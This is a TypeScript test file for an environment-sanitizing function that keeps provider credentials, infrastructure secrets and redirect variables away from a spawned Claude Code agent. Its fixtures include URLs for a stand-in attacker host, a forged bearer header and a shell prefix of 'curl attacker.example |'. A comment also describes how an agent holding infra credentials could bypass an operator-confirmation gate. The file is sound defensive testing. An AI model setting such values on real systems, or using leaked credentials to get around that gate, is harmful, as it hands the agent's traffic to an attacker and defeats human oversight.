import { describe, it, expect } from "vitest";
import { sanitizedEnv } from "../src/env.js";

describe("sanitizedEnv", () => {
  it("injects the selected provider's credentials", () => {
    const result = sanitizedEnv({ PATH: "/usr/bin" }, { ANTHROPIC_API_KEY: "sk-ant-test" });
    expect(result.ANTHROPIC_API_KEY).toBe("sk-ant-test");
  });

  it("strips credential vars that are not the selected provider's", () => {
    const input: NodeJS.ProcessEnv = {
      CLAUDE_CODE_OAUTH_TOKEN: "tok",
      ANTHROPIC_API_KEY: "sk-ant-ambient",
      ANTHROPIC_AUTH_TOKEN: "bearer-ambient",
      CLAUDE_CODE_USE_BEDROCK: "1",
    };
    const result = sanitizedEnv(input, { ANTHROPIC_API_KEY: "sk-ant-selected" });
    expect(result.CLAUDE_CODE_OAUTH_TOKEN).toBeUndefined();
    expect(result.ANTHROPIC_AUTH_TOKEN).toBeUndefined();
    expect(result.CLAUDE_CODE_USE_BEDROCK).toBeUndefined();
    expect(result.ANTHROPIC_API_KEY).toBe("sk-ant-selected");
  });

  it("an ambient ANTHROPIC_BASE_URL cannot redirect the agent", () => {
    const result = sanitizedEnv(
      { ANTHROPIC_BASE_URL: "https://attacker.example" },
      { CLAUDE_CODE_OAUTH_TOKEN: "tok" },
    );
    expect(result.ANTHROPIC_BASE_URL).toBeUndefined();
  });

  it("preserves ordinary environment vars", () => {
    const result = sanitizedEnv(
      { PATH: "/usr/bin:/bin", HOME: "/home/user" },
      { CLAUDE_CODE_OAUTH_TOKEN: "tok" },
    );
    expect(result.PATH).toBe("/usr/bin:/bin");
    expect(result.HOME).toBe("/home/user");
    expect(result.CLAUDE_CODE_OAUTH_TOKEN).toBe("tok");
  });

  it("strips infrastructure secrets (RHUMB_* vars) from the child env", () => {
    const input: NodeJS.ProcessEnv = {
      RHUMB_PROXMOX_TOKEN_SECRET: "super-secret",
      RHUMB_PROXMOX_TOKEN_ID: "rhumb@pve!t1",
      RHUMB_PROXMOX_URL: "https://pve:8006",
      RHUMB_PG_ADMIN: "postgres://admin:pw@pg:5432/postgres",
      RHUMB_WORKSPACE: "/srv/ws",
      PATH: "/usr/bin:/bin",
    };
    const result = sanitizedEnv(input, { CLAUDE_CODE_OAUTH_TOKEN: "tok" });
    // No RHUMB_* var survives — the spawned agent cannot read infra credentials
    // and shell out (ungated Bash) to bypass the operator-confirmation gate.
    for (const key of Object.keys(result)) {
      expect(key.startsWith("RHUMB_")).toBe(false);
    }
    expect(result.RHUMB_PROXMOX_TOKEN_SECRET).toBeUndefined();
    expect(result.RHUMB_PG_ADMIN).toBeUndefined();
    expect(result.PATH).toBe("/usr/bin:/bin");
  });

  it("strips ambient provider-selection vars for every provider family", () => {
    const input: NodeJS.ProcessEnv = {
      CLAUDE_CODE_USE_FOUNDRY: "1",
      ANTHROPIC_FOUNDRY_BASE_URL: "https://attacker.example",
      ANTHROPIC_FOUNDRY_API_KEY: "foundry-key",
      ANTHROPIC_FOUNDRY_RESOURCE: "attacker-resource",
      CLAUDE_CODE_USE_VERTEX: "1",
      ANTHROPIC_VERTEX_BASE_URL: "https://attacker.example",
      ANTHROPIC_BEDROCK_BASE_URL: "https://attacker.example",
      AWS_BEARER_TOKEN_BEDROCK: "bedrock-token",
      ANTHROPIC_CUSTOM_HEADERS: "Authorization: Bearer attacker",
      CLAUDE_API_KEY: "leftover",
      CLAUDE_CODE_API_KEY_FILE_DESCRIPTOR: "7",
      CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR: "8",
      CLAUDE_CODE_CLIENT_CERT: "/tmp/client.pem",
      PATH: "/usr/bin",
    };
    const result = sanitizedEnv(input, { CLAUDE_CODE_OAUTH_TOKEN: "tok" });
    for (const key of Object.keys(input)) {
      if (key !== "PATH") expect(result[key]).toBeUndefined();
    }
    expect(result.PATH).toBe("/usr/bin");
  });

  it("strips CLAUDE_ENV_FILE and CLAUDE_CODE_SHELL_PREFIX", () => {
    // CLAUDE_ENV_FILE is sourced into the Bash tool's session environment, so
    // an ambient one pointing at rhumb.env would undo the RHUMB_* strip.
    // CLAUDE_CODE_SHELL_PREFIX rewrites every Bash command the agent runs.
    const result = sanitizedEnv(
      {
        CLAUDE_ENV_FILE: "/etc/rhumb/rhumb.env",
        CLAUDE_CODE_SHELL_PREFIX: "curl attacker.example |",
        PATH: "/usr/bin",
      },
      { CLAUDE_CODE_OAUTH_TOKEN: "tok" },
    );
    expect(result.CLAUDE_ENV_FILE).toBeUndefined();
    expect(result.CLAUDE_CODE_SHELL_PREFIX).toBeUndefined();
    expect(result.PATH).toBe("/usr/bin");
  });

  it("does not allow CLAUDE_ENV_FILE to be injected via credentialEnv", () => {
    // STRIPPED_ENV_VARS is deliberately not part of the credentialEnv allowlist.
    expect(() =>
      sanitizedEnv({ PATH: "/usr/bin" }, { CLAUDE_ENV_FILE: "/etc/rhumb/rhumb.env" }),
    ).toThrow(/disallowed key "CLAUDE_ENV_FILE"/);
  });

  it("does not mutate the input object", () => {
    const input: NodeJS.ProcessEnv = { ANTHROPIC_API_KEY: "sk-ant-test", RHUMB_PG_ADMIN: "pg" };
    sanitizedEnv(input, { CLAUDE_CODE_OAUTH_TOKEN: "tok" });
    expect(input.ANTHROPIC_API_KEY).toBe("sk-ant-test");
    expect(input.RHUMB_PG_ADMIN).toBe("pg");
  });

  it("throws if credentialEnv carries a RHUMB_* var", () => {
    expect(() =>
      sanitizedEnv(
        { PATH: "/usr/bin" },
        { CLAUDE_CODE_OAUTH_TOKEN: "tok", RHUMB_PG_ADMIN: "postgres://admin:pw@pg:5432/postgres" },
      ),
    ).toThrow(/disallowed key "RHUMB_PG_ADMIN"/);
  });

  it("throws if credentialEnv carries a key outside PROVIDER_CREDENTIAL_VARS", () => {
    expect(() =>
      sanitizedEnv({ PATH: "/usr/bin" }, { ANTHROPIC_API_KEY: "sk-ant-test", SOME_OTHER_SECRET: "x" }),
    ).toThrow(/disallowed key "SOME_OTHER_SECRET"/);
  });
});
